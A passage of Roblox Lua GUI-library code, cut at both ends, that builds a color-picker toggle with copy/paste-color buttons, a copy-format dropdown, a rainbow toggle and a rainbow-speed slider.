								values[tabname][sectorname][text] = Element.value 
								function Element:SetValue(value) 
									Element.value = value 
									values[tabname][sectorname][text] = Element.value 
									update() 
									callback(Element.value) 
								end 
							elseif type == "ToggleColor" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,16) 
								Element.value = {Rainbow = false, RainbowSpeed = 3, Toggle = data.default and data.default.Toggle or false, Color = data.default and data.default.Color or C.COL3RGB(255,255,255), SetColor} 
								--print(Element.value.Color,text)
								local Toggle = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local Color = C.INST("Frame") 
								local TextLabel = C.INST("TextLabel") 

								Toggle.Name = "Toggle" 
								Toggle.Parent = Inner 
								Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Toggle.BackgroundTransparency = 1.000 
								Toggle.Size = C.UDIM2(1, 0, 0, 15) 

								Button.Name = "Button" 
								Button.Parent = Toggle 
								Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button.BackgroundTransparency = 1.000 
								Button.Size = C.UDIM2(1, 0, 1, 0) 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								Color.Name = "Color" 
								Color.Parent = Button 
								Color.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Color.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Color.Position = C.UDIM2(0, 15, 0.5, -5) 
								Color.Size = C.UDIM2(0, 8, 0, 8) 

								TextLabel.Parent = Button 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local function update() 
									if Element.value.Toggle then 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									else 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									end 
									values[tabname][sectorname][text] = Element.value 
								end


								local ColorH,ColorS,ColorV 

								local ColorP = C.INST("TextButton") 
								local Frame = C.INST("Frame") 
								local Colorpick = C.INST("ImageButton") 
								local ColorDrag = C.INST("Frame") 
								local Huepick = C.INST("ImageButton") 
								local Huedrag = C.INST("Frame") 

								ColorP.Name = "ColorP" 
								ColorP.Parent = Button 
								ColorP.AnchorPoint = C.Vec2(1, 0) 
								ColorP.BackgroundColor3 = Element.value.Color
								ColorP.BorderColor3 = C.COL3RGB(18, 18, 16) 
								ColorP.Position = C.UDIM2(0, 270, 0.5, -4) 
								ColorP.Size = C.UDIM2(0, 18, 0, 8) 
								ColorP.AutoButtonColor = false 
								ColorP.Font = Enum.Font.Gotham 
								ColorP.Text = "" 
								ColorP.TextColor3 = C.COL3RGB(200, 200, 200) 
								ColorP.TextSize = 11.000






								Frame.Parent = ColorP 
								Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Frame.Position = C.UDIM2(-0.666666687, -170, 1.375, 0) 
								Frame.Size = C.UDIM2(0, 200, 0, 300) --edit second value (10 or 20 or 30 i forgor)
								Frame.Visible = false 
								Frame.ZIndex = 4

								local Button5 = C.INST("Frame") 
								local Button_25 = C.INST("TextButton") 
								local TextLabel5 = C.INST("TextLabel") 

								Button5.Name = "Button" 
								Button5.Parent = Frame 
								Button5.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button5.BackgroundTransparency = 1.000
								Button5.Position = C.UDIM2(0, -20, 0.6, 0) --edit here
								Button5.Size = C.UDIM2(1, 0, 0, 15) 
								Button5.ZIndex = 4

								Button_25.Name = "Button" 
								Button_25.Parent = Button5
								Button_25.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button_25.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button_25.Position = C.UDIM2(0, 30, 0.5, -9) 
								Button_25.Size = C.UDIM2(0, 175, 0, 18) 
								Button_25.AutoButtonColor = false 
								Button_25.Font = Enum.Font.SourceSans 
								Button_25.Text = "" 
								Button_25.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button_25.TextSize = 11.000
								Button_25.ZIndex = 4

								TextLabel5.Parent = Button_25
								TextLabel5.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel5.BackgroundTransparency = 1.000 
								TextLabel5.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel5.Size = C.UDIM2(1, 0, 1, 0) 
								TextLabel5.Font = Enum.Font.Gotham 
								TextLabel5.Text = 'Copy colors' 
								TextLabel5.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel5.TextSize = 11.000
								TextLabel5.ZIndex = 4
								CopyColorsType = "RGB"
								Button_25.MouseButton1Down:Connect(function() 
										TextLabel5.TextColor3 = MainUIColor 
										library:Tween(TextLabel5, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										local retarded, lmao = pcall(function()
									
											local l,m,a = C.FLOOR((Element.value.Color.R*255)+0.5),C.FLOOR((Element.value.Color.G*255)+0.5),C.FLOOR((Element.value.Color.B*255)+0.5)

											if CopyColorsType == 'RGB' then
												setclipboard(''..l..','..m..','..a) -- o
											elseif CopyColorsType == 'HEX' then
												setclipboard(C.COL3RGB(l,m,a):ToHex())
											elseif CopyColorsType == 'HSV' then 
												local H,S,V = C.COL3(l,m,a):ToHSV() --hsl, cmyk
												setclipboard(''..H..','..S..','..V)
											end
										end)
											if retarded then
												TextLabel5.Text = 'Success!'
												wait(1.5)
												TextLabel5.Text = 'Copy colors'
											else
												TextLabel5.Text = 'Error!'
												wait(1.5)
												TextLabel5.Text = 'Copy colors'
												print(lmao)
												print(Element.value.Color)
												print(Element.value.Color.value)
											end
								end) 
								Button_25.MouseEnter:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
								end) 
								Button_25.MouseLeave:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								end) 								
								
								
								
								
								
								
								
								
								do
									--Element.value = {Dropdown = data.options[1]} 

									local Dropdown = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local TextLabel = C.INST("TextLabel") 
									local Drop = C.INST("ScrollingFrame") 
									local Button_2 = C.INST("TextButton") 
									local TextLabel_2 = C.INST("TextLabel") 
									local UIListLayout = C.INST("UIListLayout") 
									local ImageLabel = C.INST("ImageLabel") 
									local TextLabel_3 = C.INST("TextLabel") 
									--Frame.Size = C.UDIM2(0,200,270)
									Dropdown.Name = "Dropdown" 
									Dropdown.Parent = Frame 
									Dropdown.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Dropdown.BackgroundTransparency = 1.000 
									Dropdown.Position = C.UDIM2(0, -20, 0.6, 20) 
									Dropdown.Size = C.UDIM2(1, 0, 0, 39) 
									Dropdown.ZIndex = 4

									Button.Name = "Button" 
									Button.Parent = Dropdown 
									Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Button.Position = C.UDIM2(0, 30, 0, 16) 
									Button.Size = C.UDIM2(0, 175, 0, 17) 
									Button.AutoButtonColor = false 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000
									Button.ZIndex = 4

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
									TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
									TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = 'RGB'
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
									TextLabel.ZIndex = 4

									local abcd = TextLabel 

									Drop.Name = "Drop" 
									Drop.Parent = Button 
									Drop.Active = true 
									Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Drop.Position = C.UDIM2(0, 0, 1, 1) 
									Drop.Size = C.UDIM2(1, 0, 0, 20) 
									Drop.Visible = false 
									Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
									Drop.ScrollBarThickness = 4 
									Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.AutomaticCanvasSize = "Y" 
									Drop.ZIndex = 5 
									Drop.ScrollBarImageColor3 = MainUIColor 

									UIListLayout.Parent = Drop 
									UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
									UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder --DROPDOWN COPY COLORS
									local table = {'RGB', 'HSV', 'HEX'}
									local num = #table 
									if num > 5 then 
										Drop.Size = C.UDIM2(1, 0, 0, 85) 
									else 
										Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
									end 
									local first = true 
									for i,v in ipairs(table) do 
										do 
											local Button = C.INST("TextButton") 
											local TextLabel = C.INST("TextLabel") 

											Button.Name = v 
											Button.Parent = Drop 
											Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
											Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
											Button.Position = C.UDIM2(0, 30, 0, 16) 
											Button.Size = C.UDIM2(0, 175, 0, 17) 
											Button.AutoButtonColor = false 
											Button.Font = Enum.Font.SourceSans 
											Button.Text = "" 
											Button.TextColor3 = C.COL3RGB(0, 0, 0) 
											Button.TextSize = 11.000
											Button.BorderSizePixel = 0 
											Button.ZIndex = 6 

											TextLabel.Parent = Button 
											TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
											TextLabel.BackgroundTransparency = 1.000 
											TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
											TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
											TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
											TextLabel.Font = Enum.Font.Gotham 
											TextLabel.Text = v 
											TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
											TextLabel.TextSize = 11.000
											TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
											TextLabel.ZIndex = 6 

											Button.MouseButton1Down:Connect(function() 
												Drop.Visible = false 
												--Element.value.Dropdown = v 
												CopyColorsType = v
												abcd.Text = v 
												--values[tabname][sectorname][text] = Element.value 
												--callback(Element.value) 
												Drop.CanvasPosition = C.Vec2(0,0) 
											end) 
											Button.MouseEnter:Connect(function() 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  MainUIColor}) 
											end) 
											Button.MouseLeave:Connect(function() 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  C.COL3RGB(200, 200, 200)}) 
											end) 

											first = false 
										end 
									end

									ImageLabel.Parent = Button 
									ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									ImageLabel.BackgroundTransparency = 1.000 
									ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
									ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
									ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 
									ImageLabel.ZIndex = 4

									TextLabel_3.Parent = Dropdown 
									TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel_3.BackgroundTransparency = 1.000 
									TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
									TextLabel_3.Font = Enum.Font.Gotham 
									TextLabel_3.Text = 'Copy colors type' 
									TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel_3.TextSize = 11.000
									TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 
									TextLabel_3.ZIndex = 4

									Button.MouseButton1Down:Connect(function() 
										Drop.Visible = not Drop.Visible 
										if not Drop.Visible then 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end) 
									local indrop = false 
									local ind = false 
									Drop.MouseEnter:Connect(function() 
										indrop = true 
									end) 
									Drop.MouseLeave:Connect(function() 
										indrop = false 
									end) 
									Button.MouseEnter:Connect(function() 
										ind = true 
									end) 
									Button.MouseLeave:Connect(function() 
										ind = false 
									end) 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
											if Drop.Visible == true and not indrop and not ind then 
												Drop.Visible = false 
												Drop.CanvasPosition = C.Vec2(0,0) 
											end 
										end 
									end) 								
								end
								
								
								local Button35 = C.INST("Frame") 
								local Button_325 = C.INST("TextButton") 
								local TextLabel35 = C.INST("TextLabel") 

								Button35.Name = "Button" 
								Button35.Parent = Frame 
								Button35.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button35.BackgroundTransparency = 1.000 
								Button35.Position = C.UDIM2(0, -20, 0.6, 60) --edit here
								Button35.Size = C.UDIM2(1, 0, 0, 15) 
								Button35.ZIndex = 4

								Button_325.Name = "Button" 
								Button_325.Parent = Button35
								Button_325.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button_325.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button_325.Position = C.UDIM2(0, 30, 0.5, -9) 
								Button_325.Size = C.UDIM2(0, 175, 0, 18) 
								Button_325.AutoButtonColor = false 
								Button_325.Font = Enum.Font.SourceSans 
								Button_325.Text = "" 
								Button_325.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button_325.TextSize = 11.000
								Button_325.ZIndex = 4

								TextLabel35.Parent = Button_325
								TextLabel35.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel35.BackgroundTransparency = 1.000 
								TextLabel35.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel35.Size = C.UDIM2(1, 0, 1, 0) 
								TextLabel35.Font = Enum.Font.Gotham 
								TextLabel35.Text = 'Paste colors' 
								TextLabel35.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel35.TextSize = 11.000
								TextLabel35.ZIndex = 4

									

									
								Button_325.MouseButton1Down:Connect(function() 
									TextLabel35.TextColor3 = MainUIColor 
									library:Tween(TextLabel35, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									local clipboard = getclipboard()
									local colors = string.split(clipboard, ',')
									local IsAColor = false
									local WhatKindOfColor = ''
									if pcall(function() return C.COL3HEX(clipboard:gsub('#','')) end) then
										IsAColor = true
										WhatKindOfColor = 'HEX'
									elseif #colors == 3 and (tonumber(colors[1]) and tonumber(colors[1]) <= 256 and tonumber(colors[1]) >= -1) and (tonumber(colors[2]) and tonumber(colors[2]) <= 256 and tonumber(colors[2]) >= -1) and (tonumber(colors[3]) and tonumber(colors[3]) <= 256 and tonumber(colors[3]) >= -1) then
										IsAColor = true
										WhatKindOfColor = 'RGB'
									end
									
									
									if IsAColor then
										local retarded, lmao = pcall(function()
											if WhatKindOfColor == 'RGB' then
												Element.value.Color = C.COL3RGB(colors[1],colors[2],colors[3])
											elseif WhatKindOfColor == 'HEX' then
												Element.value.Color = C.COL3HEX(tostring(clipboard:gsub('#','')))
											end
											ColorH, ColorS, ColorV = Element.value.Color:ToHSV() 

											ColorH = C.CLAMP(ColorH,0,1) 
											ColorS = C.CLAMP(ColorS,0,1) 
											ColorV = C.CLAMP(ColorV,0,1) 
											ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
											Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
											
											ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
											Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
											values[tabname][sectorname][text] = Element.value 
											Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
											callback(Element.value) 
										end)
											if retarded then
												TextLabel35.Text = 'Success!'
												wait(1.5)
												TextLabel35.Text = 'Paste colors'
											else
												TextLabel35.Text = 'Error!'
												wait(1.5)
												TextLabel35.Text = 'Paste colors'
												print(lmao)
											end
									else
										TextLabel35.Text = 'Not a color'
										wait(1.5)
										TextLabel35.Text = "Paste colors"
									end
								end)
								Button_325.MouseEnter:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
								end) 
								Button_325.MouseLeave:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								end)
								
								
								
								
								-------------------------------------------------------------------
									local Toggle123 = C.INST("Frame") 
									local Button123 = C.INST("TextButton") 
									local Color123 = C.INST("Frame") 
									local TextLabel123 = C.INST("TextLabel") 
									
									Toggle123.Name = "Toggle123" 
									Toggle123.Parent = Frame 
									Toggle123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Toggle123.BackgroundTransparency = 1.000 
									Toggle123.Size = C.UDIM2(1, 0, 0, 15) 
									Toggle123.Position = C.UDIM2(0, -5, 0.6, 80) --edit here
									Toggle123.ZIndex = 4
									
									--print('it actually spawned')
									
									Button123.Name = "Button123" 
									Button123.Parent = Toggle123 
									Button123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Button123.BackgroundTransparency = 1.000 
									Button123.Size = C.UDIM2(1, 0, 1, 0) 
									Button123.Font = Enum.Font.SourceSans 
									Button123.Text = "" 
									Button123.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button123.TextSize = 11.000
									Button123.ZIndex = 4

									Color123.Name = "Color123" 
									Color123.Parent = Button123
									
									Color123.BackgroundColor3 = MainUIColor 
									
									Color123.BackgroundColor3 = C.COL3RGB(46, 46, 46)
									Color123.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Color123.Position = C.UDIM2(0, 15, 0.5, -5) 
									Color123.Size = C.UDIM2(0, 8, 0, 8) 
									Color123.ZIndex = 4

									TextLabel123.Parent = Button123 
									TextLabel123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel123.BackgroundTransparency = 1.000 
									TextLabel123.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel123.Size = C.UDIM2(0.111913361, 208, 1, 0) 
									TextLabel123.Font = Enum.Font.Gotham 
									TextLabel123.Text = "Rainbow" 
									TextLabel123.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel123.TextSize = 11.000
									TextLabel123.TextXAlignment = Enum.TextXAlignment.Left 
									TextLabel123.ZIndex = 4

									local function update123() 
										if Element.value.Rainbow then 
											tween123 = library:Tween(Color123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
											library:Tween(TextLabel123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
										else 
											--keybindremove(text, Element.value.Key) 
											tween123 = library:Tween(Color123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
											library:Tween(TextLabel123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
										--values[tabname][sectorname][tabtext][text] = Element.value 
									end
									
									Button123.MouseButton1Down:Connect(function() 
										Element.value.Rainbow = not Element.value.Rainbow
										update123() 				
										--values[tabname][sectorname][tabtext][text] = Element.value 
										--callback(Element.value) 
									end)
								
											game.RunService.RenderStepped:Connect(function()
												if Element.value.Rainbow then
													--Element.value.RainbowSpeed
														ColorH, ColorS, ColorV = (tick() % Element.value.RainbowSpeed/Element.value.RainbowSpeed),1,1

														ColorH = C.CLAMP(ColorH,0,1) 
														ColorS = C.CLAMP(ColorS,0,1) 
														ColorV = C.CLAMP(ColorV,0,1)
																							
														ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
														Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

														ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
														Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
														values[tabname][sectorname][text] = Element.value 
														Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
														callback(Element.value)
																							
																							--library.options['armColor']:SetColor(Color3.fromHSV(i,1,1))
														wait()
																				--		library.options['Accent Color']:SetColor(Color3.fromHSV(i,1,1)) -- also u can change any flag that has color by prinitng flags (table.foreach(library.flags,print)
												end
											end)									
								local Slider2113132 = C.INST("Frame") 
								local TextLabel2113132 = C.INST("TextLabel") 
								local Button2113132 = C.INST("TextButton") 
								local Frame123123 = C.INST("Frame") 
								local UIGradient123123 = C.INST("UIGradient") 
								local Value123123123 = C.INST("TextLabel") 

								Slider2113132.Name = "Slider2113132" 
								Slider2113132.Parent = Frame 
								Slider2113132.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Slider2113132.BackgroundTransparency = 1.000 
								Slider2113132.Position = C.UDIM2(0, -15, 0.6, 93) --edit here
								Slider2113132.Size = C.UDIM2(1, 0, 0, 25) 
								Slider2113132.ZIndex = 4

								TextLabel2113132.Parent = Slider2113132 
								TextLabel2113132.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel2113132.BackgroundTransparency = 1.000 
								TextLabel2113132.Position = C.UDIM2(0, 32, 0, -2) 
								TextLabel2113132.Size = C.UDIM2(0, 100, 0, 15) 
								TextLabel2113132.Font = Enum.Font.Gotham 
								TextLabel2113132.Text = "Rainbow speed" 
								TextLabel2113132.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel2113132.TextSize = 11.000
								TextLabel2113132.TextXAlignment = Enum.TextXAlignment.Left 
								TextLabel2113132.ZIndex = 4

								Button2113132.Name = "Button2113132" 
								Button2113132.Parent = Slider2113132 
								Button2113132.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button2113132.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button2113132.Position = C.UDIM2(0, 30, 0, 15) 
								Button2113132.Size = C.UDIM2(0, 175, 0, 5) 
								Button2113132.AutoButtonColor = false 
								Button2113132.Font = Enum.Font.SourceSans 
								Button2113132.Text = "" 
								Button2113132.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button2113132.TextSize = 11.000
								Button2113132.ZIndex = 4

								Frame123123.Parent = Button2113132 
								Frame123123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Frame123123.BorderSizePixel = 0 
								Frame123123.Size = C.UDIM2(0.5, 0, 1, 0) 
								Frame123123.ZIndex = 4
								
								UIGradient123123.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, MainUIColor), ColorSequenceKeypoint.new(1.00, C.COL3RGB(75, 92, 112))}
								
								
								UIGradient123123.Rotation = 90
								UIGradient123123.Parent = Frame123123


								Value123123123.Name = "Value123123123" 
								Value123123123.Parent = Slider2113132 
								Value123123123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Value123123123.BackgroundTransparency = 1.000 
								Value123123123.Position = C.UDIM2(0, 30, 0, 15) 
								Value123123123.Size = C.UDIM2(0, 175, 0, 5)  
								Value123123123.Font = Enum.Font.Gotham 
								Value123123123.Text = "50" 
								Value123123123.TextStrokeTransparency = 0.000
								Value123123123.TextColor3 = C.COL3RGB(200, 200, 200) 
								Value123123123.TextSize = 11.000 
								Value123123123.ZIndex = 4
								local min, max, default = 1, 6, 3
								--Element.Value123123123 = {Slider2113132 = default}
								local a
								if min > 0 then 
									a = ((Element.value.RainbowSpeed - min)) / (max-min) 
								else 
									a = (Element.value.RainbowSpeed-min)/(max-min) 
								end 
								Value123123123.Text = default
								Frame123123.Size = C.UDIM2(a,0,1,0) 
								--values[tabname][sectorname][text] = Element.Value123123123 
								local uis = game:GetService('UserInputService')
								local mouse = game.Players.LocalPlayer:GetMouse() 
								local val 
								Button2113132.MouseButton1Down:Connect(function() 
									Frame123123.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame123123.AbsolutePosition.X, 0, 175), 0, 5) 
									val = (((tonumber(max) - tonumber(min)) / 175) * Frame123123.AbsoluteSize.X) + tonumber(min)or 0 
										if string.find(tostring(val),'.') then
											valstring = tostring(val)
											valtable = string.split(val,'.')
											if #valtable ~= 0 and typeof(valtable[1]) == 'string' and typeof(valtable[2]) == 'string'  then
											  valstring2 = string.sub(valtable[2],1,2)
											  valstring = valtable[1]..'.'..valstring2
											  val = tonumber(valstring)
											end
										end
											--print(val)
											--pri
									Value123123123.Text = val 
									Element.value.RainbowSpeed = val 
									--values[tabname][sectorname][text] = Element.Value123123123 
									--callback(Element.Value123123123) 
									moveconnection = mouse.Move:Connect(function() 
										Frame123123.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame123123.AbsolutePosition.X, 0, 175), 0, 5) 
										val = (((tonumber(max) - tonumber(min)) / 175) * Frame123123.AbsoluteSize.X) + tonumber(min)
										if string.find(tostring(val),'.') then
											valstring = tostring(val)
											valtable = string.split(val,'.')
											if #valtable ~= 0 and typeof(valtable[1]) == 'string' and typeof(valtable[2]) == 'string'  then
											  valstring2 = string.sub(valtable[2],1,2)
											  valstring = valtable[1]..'.'..valstring2
											  val = tonumber(valstring)
											end
										end
											--print(val)
											--pri
										Value123123123.Text = val 
										--RainbowSpeed = val 
										--values[tabname][sectorname][text] = Element.Value123123123 
										--callback(Element.Value123123123) 
									end) 
									releaseconnection = uis.InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											Frame123123.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame123123.AbsolutePosition.X, 0, 175), 0, 5) 
											val = (((tonumber(max) - tonumber(min)) / 175) * Frame123123.AbsoluteSize.X) + tonumber(min)
										if string.find(tostring(val),'.') then
											valstring = tostring(val)
											valtable = string.split(val,'.')
											if #valtable ~= 0 and typeof(valtable[1]) == 'string' and typeof(valtable[2]) == 'string'  then
											  valstring2 = string.sub(valtable[2],1,2)
											  valstring = valtable[1]..'.'..valstring2
											  val = tonumber(valstring)
											end
										end
											--print(val)
											--pri
											--values[tabname][sectorname][text] = Element.Value123123123 
											--callback(Element.Value123123123) 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 							
								---------------------------------------------------------------------------------------------------------------------
								
								
								Colorpick.Name = "Colorpick" 
								Colorpick.Parent = Frame 
								Colorpick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Colorpick.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Colorpick.ClipsDescendants = false 
								Colorpick.Position = C.UDIM2(0, 40, 0, 10) 
								Colorpick.Size = C.UDIM2(0, 150, 0, 150) 
								Colorpick.AutoButtonColor = false 
								Colorpick.Image = "rbxassetid://4155801252" 
								Colorpick.ImageColor3 = C.COL3RGB(255, 0, 0) 
								Colorpick.ZIndex = 4 

								ColorDrag.Name = "ColorDrag" 
								ColorDrag.Parent = Colorpick 
								ColorDrag.AnchorPoint = C.Vec2(0.5, 0.5) 
								ColorDrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								ColorDrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
								ColorDrag.Size = C.UDIM2(0, 4, 0, 4) 
								ColorDrag.ZIndex = 4

								Huepick.Name = "Huepick" 
								Huepick.Parent = Frame 
								Huepick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Huepick.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Huepick.ClipsDescendants = false 
								Huepick.Position = C.UDIM2(0, 10, 0, 10) 
								Huepick.Size = C.UDIM2(0, 20, 0, 150) 
								Huepick.AutoButtonColor = false 
								Huepick.Image = "rbxassetid://3641079629" 
								Huepick.ImageColor3 = C.COL3RGB(255, 0, 0) 
								Huepick.ImageTransparency = 1 
								Huepick.BackgroundTransparency = 0 
								Huepick.ZIndex = 4

								local HueFrameGradient = C.INST("UIGradient") 
								HueFrameGradient.Rotation = 90 
								HueFrameGradient.Name = "HueFrameGradient" 
								HueFrameGradient.Parent = Huepick 
								HueFrameGradient.Color = ColorSequence.new { 
